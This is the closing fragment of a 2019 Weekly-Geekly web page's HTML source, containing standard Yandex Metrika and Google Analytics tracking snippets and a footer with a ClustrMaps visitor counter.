      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>